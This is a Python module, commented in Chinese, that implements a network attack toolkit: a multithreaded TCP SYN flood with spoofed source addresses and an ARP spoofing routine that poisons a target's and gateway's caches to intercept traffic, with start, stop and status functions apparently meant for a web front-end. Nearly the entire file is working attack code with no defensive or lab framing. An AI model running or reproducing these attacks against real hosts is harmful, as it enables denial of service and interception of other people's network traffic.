#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import socket
import random
import threading
import subprocess
from scapy.all import send, IP, TCP, ARP, Ether

class AttackTools:
    # 存储所有活跃的攻击
    active_attacks = {
        "syn_flood": {},
        "arp_spoof": {}
    }
    
    # 存储攻击统计信息
    attack_stats = {
        "syn_flood": {},
        "arp_spoof": {}
    }
    
    @staticmethod
    def is_valid_ip(ip):
        """验证IP地址是否有效"""
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False
    
    @staticmethod
    def is_valid_port(port):
        """验证端口号是否有效"""
        try:
            port = int(port)
            return 0 < port < 65536
        except ValueError:
            return False
    
    @staticmethod
    def syn_flood(target_ip, target_port, attack_time=60, threads=10):
        """
        执行TCP SYN洪水攻击
        :param target_ip: 目标IP地址
        :param target_port: 目标端口
        :param attack_time: 攻击持续时间(秒)
        :param threads: 线程数
        :return: 攻击开始信息
        """
        if not AttackTools.is_valid_ip(target_ip):
            return {"status": "error", "message": "无效的IP地址"}
        
        if not AttackTools.is_valid_port(target_port):
            return {"status": "error", "message": "无效的端口号"}
        
        try:
            target_port = int(target_port)
            attack_id = f"{target_ip}:{target_port}"
            
            # 检查是否已经有对相同目标的攻击
            if attack_id in AttackTools.active_attacks["syn_flood"]:
                return {"status": "error", "message": f"已经有对目标 {target_ip}:{target_port} 的攻击正在进行中"}
            
            # 创建停止标志
            stop_event = threading.Event()
            AttackTools.active_attacks["syn_flood"][attack_id] = {
                "stop_event": stop_event,
                "start_time": time.time(),
                "end_time": time.time() + attack_time,
                "target_ip": target_ip,
                "target_port": target_port,
                "threads": threads,
                "packets_sent": 0
            }
            
            # 初始化统计信息
            AttackTools.attack_stats["syn_flood"][attack_id] = {
                "packets_sent": 0,
                "start_time": time.time(),
                "progress": 0
            }
            
            # 创建攻击函数
            def syn_flood_thread():
                start_time = time.time()
                sent_packets = 0
                
                while time.time() - start_time < attack_time and not stop_event.is_set():
                    # 创建随机源IP
                    source_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
                    # 创建随机源端口
                    source_port = random.randint(1024, 65535)
                    
                    # 构建SYN数据包
                    packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags="S")
                    
                    try:
                        send(packet, verbose=0)
                        sent_packets += 1
                        
                        # 更新统计信息
                        AttackTools.attack_stats["syn_flood"][attack_id]["packets_sent"] += 1
                        elapsed = time.time() - start_time
                        if attack_time > 0:
                            progress = min(100, (elapsed / attack_time) * 100)
                            AttackTools.attack_stats["syn_flood"][attack_id]["progress"] = progress
                    except Exception:
                        pass
                
                # 如果线程因为时间到而结束，而不是被手动停止
                if not stop_event.is_set() and time.time() - start_time >= attack_time:
                    # 检查所有线程是否完成，最后一个完成的线程将清理资源
                    AttackTools.active_attacks["syn_flood"][attack_id]["threads"] -= 1
                    if AttackTools.active_attacks["syn_flood"][attack_id]["threads"] <= 0:
                        AttackTools.attack_stats["syn_flood"][attack_id]["progress"] = 100
                        # 保留统计信息一段时间以便前端获取，但删除活跃攻击记录
                        if attack_id in AttackTools.active_attacks["syn_flood"]:
                            del AttackTools.active_attacks["syn_flood"][attack_id]
                
                return sent_packets
            
            # 启动多线程攻击
            attack_threads = []
            for _ in range(threads):
                thread = threading.Thread(target=syn_flood_thread)
                thread.daemon = True
                attack_threads.append(thread)
                thread.start()
            
            return {
                "status": "success", 
                "message": f"TCP SYN攻击已启动，目标: {target_ip}:{target_port}，持续时间: {attack_time}秒，线程数: {threads}",
                "attack_id": attack_id
            }
        except Exception as e:
            return {"status": "error", "message": f"攻击失败: {str(e)}"}
    
    @staticmethod
    def stop_syn_flood(attack_id):
        """
        停止指定的SYN洪水攻击
        :param attack_id: 攻击ID (格式: target_ip:target_port)
        :return: 操作结果
        """
        if attack_id in AttackTools.active_attacks["syn_flood"]:
            # 设置停止标志
            AttackTools.active_attacks["syn_flood"][attack_id]["stop_event"].set()
            # 标记为已完成
            AttackTools.attack_stats["syn_flood"][attack_id]["progress"] = 100
            # 移除活跃攻击记录
            del AttackTools.active_attacks["syn_flood"][attack_id]
            return {"status": "success", "message": f"已停止对 {attack_id} 的TCP SYN攻击"}
        else:
            return {"status": "error", "message": f"未找到对 {attack_id} 的活跃攻击"}
    
    @staticmethod
    def get_syn_flood_status(attack_id=None):
        """
        获取SYN洪水攻击的状态
        :param attack_id: 攻击ID，如果为None则返回所有活跃攻击
        :return: 攻击状态信息
        """
        if attack_id:
            if attack_id in AttackTools.attack_stats["syn_flood"]:
                stats = AttackTools.attack_stats["syn_flood"][attack_id].copy()
                # 计算攻击的实时进度
                if attack_id in AttackTools.active_attacks["syn_flood"]:
                    attack_info = AttackTools.active_attacks["syn_flood"][attack_id]
                    elapsed = time.time() - attack_info["start_time"]
                    total_time = attack_info["end_time"] - attack_info["start_time"]
                    if total_time > 0:
                        stats["progress"] = min(99.9, (elapsed / total_time) * 100)
                
                return {
                    "status": "success",
                    "is_active": attack_id in AttackTools.active_attacks["syn_flood"],
                    "stats": stats
                }
            else:
                return {"status": "error", "message": f"未找到对 {attack_id} 的攻击统计信息"}
        else:
            # 返回所有活跃的SYN攻击
            active_attacks = {}
            for id, stats in AttackTools.attack_stats["syn_flood"].items():
                active_attacks[id] = {
                    "is_active": id in AttackTools.active_attacks["syn_flood"],
                    "stats": stats
                }
            return {"status": "success", "attacks": active_attacks}
    
    @staticmethod
    def arp_spoof(target_ip, gateway_ip="", interface=""):
        """
        执行ARP欺骗攻击
        :param target_ip: 目标IP地址
        :param gateway_ip: 网关IP地址
        :param interface: 网络接口
        :return: 攻击开始信息
        """
        if not AttackTools.is_valid_ip(target_ip):
            return {"status": "error", "message": "无效的目标IP地址"}
        
        # 检查是否已有对该目标的攻击
        attack_id = f"{target_ip}"
        if attack_id in AttackTools.active_attacks["arp_spoof"]:
            return {"status": "error", "message": f"已经有对目标 {target_ip} 的ARP攻击正在进行中"}
        
        # 如果未提供网关IP，尝试自动检测
        if not gateway_ip or not AttackTools.is_valid_ip(gateway_ip):
            try:
                # 尝试自动检测网关
                if sys.platform == "darwin":  # macOS
                    cmd = "route -n get default | grep gateway | awk '{print $2}'"
                    gateway_ip = subprocess.check_output(cmd, shell=True).decode().strip()
                elif sys.platform == "linux":
                    cmd = "ip route | grep default | awk '{print $3}'"
                    gateway_ip = subprocess.check_output(cmd, shell=True).decode().strip()
                else:
                    return {"status": "error", "message": "无法自动检测网关IP，请手动提供"}
            except Exception:
                return {"status": "error", "message": "无法自动检测网关IP，请手动提供"}
        
        if not interface:
            try:
                # 尝试自动检测网络接口
                if sys.platform == "darwin":  # macOS
                    cmd = "route -n get default | grep interface | awk '{print $2}'"
                    interface = subprocess.check_output(cmd, shell=True).decode().strip()
                elif sys.platform == "linux":
                    cmd = "ip route | grep default | awk '{print $5}'"
                    interface = subprocess.check_output(cmd, shell=True).decode().strip()
                else:
                    return {"status": "error", "message": "无法自动检测网络接口，请手动提供"}
            except Exception:
                return {"status": "error", "message": "无法自动检测网络接口，请手动提供"}
        
        try:
            # 获取目标MAC地址
            target_mac = None
            gateway_mac = None
            
            try:
                # 发送ARP请求获取目标MAC
                arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)
                response = send(arp_request, verbose=0, return_packets=True)
                for packet in response:
                    if ARP in packet and packet[ARP].op == 2:  # ARP响应
                        target_mac = packet[ARP].hwsrc
                        break
                
                # 发送ARP请求获取网关MAC
                arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gateway_ip)
                response = send(arp_request, verbose=0, return_packets=True)
                for packet in response:
                    if ARP in packet and packet[ARP].op == 2:  # ARP响应
                        gateway_mac = packet[ARP].hwsrc
                        break
            except Exception:
                pass
            
            if not target_mac or not gateway_mac:
                # 如果无法获取MAC地址，尝试使用arping命令
                try:
                    if sys.platform == "darwin" or sys.platform == "linux":
                        cmd = f"arping -c 1 {target_ip} | grep -oE '([0-9A-Fa-f]{{2}}:){{5}}[0-9A-Fa-f]{{2}}'"
                        target_mac = subprocess.check_output(cmd, shell=True).decode().strip()
                        
                        cmd = f"arping -c 1 {gateway_ip} | grep -oE '([0-9A-Fa-f]{{2}}:){{5}}[0-9A-Fa-f]{{2}}'"
                        gateway_mac = subprocess.check_output(cmd, shell=True).decode().strip()
                except Exception:
                    pass
            
            if not target_mac or not gateway_mac:
                return {"status": "error", "message": "无法获取目标或网关MAC地址"}
            
            # 创建停止标志
            stop_event = threading.Event()
            AttackTools.active_attacks["arp_spoof"][attack_id] = {
                "stop_event": stop_event,
                "start_time": time.time(),
                "target_ip": target_ip,
                "gateway_ip": gateway_ip,
                "target_mac": target_mac,
                "gateway_mac": gateway_mac,
                "interface": interface
            }
            
            # 初始化统计信息
            AttackTools.attack_stats["arp_spoof"][attack_id] = {
                "packets_sent": 0,
                "start_time": time.time(),
                "last_update": time.time()
            }
            
            # 创建ARP欺骗函数
            def arp_spoof_thread():
                try:
                    # 告诉目标我是网关
                    packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                    # 告诉网关我是目标
                    packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
                    
                    sent_count = 0
                    while not stop_event.is_set():
                        send(packet1, verbose=0)
                        send(packet2, verbose=0)
                        sent_count += 2
                        
                        # 更新统计信息
                        AttackTools.attack_stats["arp_spoof"][attack_id]["packets_sent"] += 2
                        AttackTools.attack_stats["arp_spoof"][attack_id]["last_update"] = time.time()
                        
                        # 每2秒发送一次
                        time.sleep(2)
                except Exception:
                    pass
                
                # 如果线程被停止，清理资源
                if stop_event.is_set() and attack_id in AttackTools.active_attacks["arp_spoof"]:
                    del AttackTools.active_attacks["arp_spoof"][attack_id]
            
            # 启动ARP攻击线程
            thread = threading.Thread(target=arp_spoof_thread)
            thread.daemon = True
            thread.start()
            
            return {
                "status": "success", 
                "message": f"ARP欺骗攻击已启动，目标: {target_ip}，网关: {gateway_ip}，接口: {interface}",
                "attack_id": attack_id
            }
        except Exception as e:
            return {"status": "error", "message": f"ARP攻击失败: {str(e)}"}
    
    @staticmethod
    def stop_arp_spoof(attack_id):
        """
        停止指定的ARP欺骗攻击
        :param attack_id: 攻击ID (格式: target_ip)
        :return: 操作结果
        """
        if attack_id in AttackTools.active_attacks["arp_spoof"]:
            # 设置停止标志
            AttackTools.active_attacks["arp_spoof"][attack_id]["stop_event"].set()
            return {"status": "success", "message": f"已停止对 {attack_id} 的ARP欺骗攻击"}
        else:
            return {"status": "error", "message": f"未找到对 {attack_id} 的活跃ARP攻击"}
    
    @staticmethod
    def get_arp_spoof_status(attack_id=None):
        """
        获取ARP欺骗攻击的状态
        :param attack_id: 攻击ID，如果为None则返回所有活跃攻击
        :return: 攻击状态信息
        """
        if attack_id:
            if attack_id in AttackTools.attack_stats["arp_spoof"]:
                stats = AttackTools.attack_stats["arp_spoof"][attack_id].copy()
                # 检查攻击是否仍然活跃
                is_active = attack_id in AttackTools.active_attacks["arp_spoof"]
                
                # 如果距离上次更新超过5秒，且攻击应该是活跃的，说明可能出现了问题
                if is_active and time.time() - stats["last_update"] > 5:
                    # 可能攻击已经停止但没有正确清理
                    if attack_id in AttackTools.active_attacks["arp_spoof"]:
                        del AttackTools.active_attacks["arp_spoof"][attack_id]
                    is_active = False
                
                return {
                    "status": "success",
                    "is_active": is_active,
                    "stats": stats
                }
            else:
                return {"status": "error", "message": f"未找到对 {attack_id} 的攻击统计信息"}
        else:
            # 返回所有活跃的ARP攻击
            active_attacks = {}
            for id, stats in AttackTools.attack_stats["arp_spoof"].items():
                is_active = id in AttackTools.active_attacks["arp_spoof"]
                
                # 如果距离上次更新超过5秒，且攻击应该是活跃的，说明可能出现了问题
                if is_active and time.time() - stats["last_update"] > 5:
                    # 可能攻击已经停止但没有正确清理
                    if id in AttackTools.active_attacks["arp_spoof"]:
                        del AttackTools.active_attacks["arp_spoof"][id]
                    is_active = False
                
                active_attacks[id] = {
                    "is_active": is_active,
                    "stats": stats
                }
            return {"status": "success", "attacks": active_attacks} 